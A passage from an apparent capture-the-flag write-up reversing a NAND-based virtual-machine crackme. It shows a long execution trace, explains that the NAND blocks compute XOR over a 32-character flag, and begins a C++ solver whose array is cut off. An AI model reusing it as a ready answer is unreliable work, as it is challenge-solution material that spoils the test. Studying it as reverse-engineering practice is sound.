v1[150] (55)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(296)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[296] = v12 (7)</span><br><span class="line">v10 = v1[320] (55)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (56)</span><br><span class="line">v15 = &amp;v1[325] (8)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (8)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(56)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (56)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[297] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 56 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-49)</span><br><span class="line">v10 = c(-49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (8)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 56</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-9)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-1)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -1 ; c = -9</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (8)</span><br><span class="line">v14 = v1[320] (8)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (56)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(297)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] )</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[297] = v12 (8)</span><br><span class="line">v10 = v1[320] (56)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (57)</span><br><span class="line">v15 = &amp;v1[325] (7)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (9)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(57)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (57)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[298] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 57 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-49)</span><br><span class="line">v10 = c(-49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (9)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 57</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-10)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-1)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -1 ; c = -10</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (9)</span><br><span class="line">v14 = v1[320] (9)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (57)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(298)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ( )</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[298] = v12 (9)</span><br><span class="line">v10 = v1[320] (57)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (58)</span><br><span class="line">v15 = &amp;v1[325] (6)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (:)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(58)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (58)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[299] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 58 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-49)</span><br><span class="line">v10 = c(-49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (:)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 58</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-11)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-1)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -1 ; c = -11</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (10)</span><br><span class="line">v14 = v1[320] (:)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (58)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(299)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] (</span><br><span class="line">)</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[299] = v12 (10)</span><br><span class="line">v10 = v1[320] (58)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (59)</span><br><span class="line">v15 = &amp;v1[325] (5)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (;)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(59)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (59)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[300] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 59 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-49)</span><br><span class="line">v10 = c(-49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (;)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 59</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-12)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-1)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -1 ; c = -12</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (11)</span><br><span class="line">v14 = v1[320] (;)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (59)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(300)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[300] = v12 (11)</span><br><span class="line">v10 = v1[320] (59)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (60)</span><br><span class="line">v15 = &amp;v1[325] (4)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (&lt;)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(60)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (60)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[301] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 60 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-49)</span><br><span class="line">v10 = c(-49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (&lt;)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 60</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-13)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-1)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -1 ; c = -13</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (12)</span><br><span class="line">v14 = v1[320] (&lt;)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (60)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(301)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[301] = v12 (12)</span><br><span class="line">v10 = v1[320] (60)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (61)</span><br><span class="line">v15 = &amp;v1[325] (3)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (=)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(61)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (61)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[302] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 61 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-49)</span><br><span class="line">v10 = c(-49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (=)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 61</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-14)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-1)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -1 ; c = -14</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (13)</span><br><span class="line">v14 = v1[320] (=)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (61)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(302)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">)14 = v1[324] (</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[302] = v12 (13)</span><br><span class="line">v10 = v1[320] (61)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (62)</span><br><span class="line">v15 = &amp;v1[325] (2)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (&gt;)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(62)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (62)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[303] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 62 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-49)</span><br><span class="line">v10 = c(-49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (&gt;)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 62</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-15)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-1)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -1 ; c = -15</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (14)</span><br><span class="line">v14 = v1[320] (&gt;)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (62)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(303)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[303] = v12 (14)</span><br><span class="line">v10 = v1[320] (62)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (63)</span><br><span class="line">v15 = &amp;v1[325] (1)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (?)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(63)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (63)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[304] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 63 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-49)</span><br><span class="line">v10 = c(-49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (?)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 63</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-16)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-1)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -1 ; c = -16</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (15)</span><br><span class="line">v14 = v1[320] (?)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (63)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(304)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[304] = v12 (15)</span><br><span class="line">v10 = v1[320] (63)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (64)</span><br><span class="line">v15 = &amp;v1[325] (0)</span><br><span class="line">v14 = v1[326] ()</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[188] (31)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[36] (  )</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(9)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[326] ()</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[200] (31)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[304] ()</span><br><span class="line">c = v14</span><br><span class="line">__dword_6010A4 = 9     c = 15</span><br><span class="line">v14 = c - dword_6010A4</span><br><span class="line">c = v14</span><br><span class="line">v10 =v1[353] (336)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v14 = v1[337] (W)</span><br><span class="line">c = v14</span><br><span class="line">output:</span><br><span class="line">Wv15 = &amp;v1[336] (5)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">v14 = v1[338] (r)</span><br><span class="line">c = v14</span><br><span class="line">output:</span><br><span class="line">rv15 = &amp;v1[336] (4)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">v14 = v1[339] (o)</span><br><span class="line">c = v14</span><br><span class="line">output:</span><br><span class="line">ov15 = &amp;v1[336] (3)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">v14 = v1[340] (n)</span><br><span class="line">c = v14</span><br><span class="line">output:</span><br><span class="line">nv15 = &amp;v1[336] (2)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">v14 = v1[341] (g)</span><br><span class="line">c = v14</span><br><span class="line">output:</span><br><span class="line">gv15 = &amp;v1[336] (1)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">v14 = v1[342] (</span><br><span class="line">)</span><br><span class="line">c = v14</span><br><span class="line">output:</span><br><span class="line"></span><br><span class="line">v15 = &amp;v1[336] (0)</span><br><span class="line">return</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
<p>To analyze what it did, we can start from how it print and read. From testing, it read 32 characters(which is the length of flag). And we know that the input is store in v1[273] ~ v1[304]. It’s basicly a NAND machine. From what we got after stimulate the program, we can see 32 ‘blocks’ and each blocks got four  <code>NAND</code> .</p>
<p><img loading="lazy" data-src="VM/blocks.png" alt="VM"></p>
<h5 id="thats-what-we-got"><a class="markdownIt-Anchor" href="#thats-what-we-got">#</a> That’s what we got:</h5>
<pre><code>d_1 = ((a nand b) nand b) nand ((a nand b) nand b) 
</code></pre>
<p>All of them make  <code>xor</code> . Go back to the main vm_run function, here’s what the rest of the case do:</p>
<p><img loading="lazy" data-src="VM/1.png" alt="VM"><br>
<img loading="lazy" data-src="VM/2.png" alt="VM"></p>
<h5 id="so-dynamic-debugger-to-dump-the-array-v1-and-the-script"><a class="markdownIt-Anchor" href="#so-dynamic-debugger-to-dump-the-array-v1-and-the-script">#</a> So dynamic debugger to dump the array  <code>v1</code>  and the script:</h5>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="type">int</span> a[]=&#123;<span class="number">1</span>, <span class="number">48</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">24</span>, <span class="number">67</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">71</span>, <span class="number">64</span>, <span class="number">23</span>, <span class="number">16</span>, <span class="number">29</span>, <span class="number">75</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">73</span>, <span class="number">72</span>, <span class="number">24</span>, <span class="number">83</span>, <span class="number">84</span>, <span class="number">1</span>, <span class="number">87</span>, <span class="number">81</span>, <span class="number">83</span>, <span class="number">5</span>, <span class="number">86</span>, <span class="number">90</span>, <span class="number">8</span>, <span class="number">88</span>, <span class="number">95</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">88</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">18</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">53</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">21</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">102</span>, <span class="number">22</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">3</span>, <span class="number">64</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">241</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">4</span>, <span class="number">67</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">65</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">3</span>, <span class="number">64</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">66</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">65</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">67</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">3</span>, <span class="number">66</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">68</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">3</span>, <span class="number">64</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">241</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">3</span>, <span class="number">68</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">5</span>, <span class="number">64</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">64</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">69</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">85</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">3</span>, <span class="number">70</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">16</span>, <span class="number">3</span>, <span class="number">70</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">96</span>, <span class="number">1</span>, 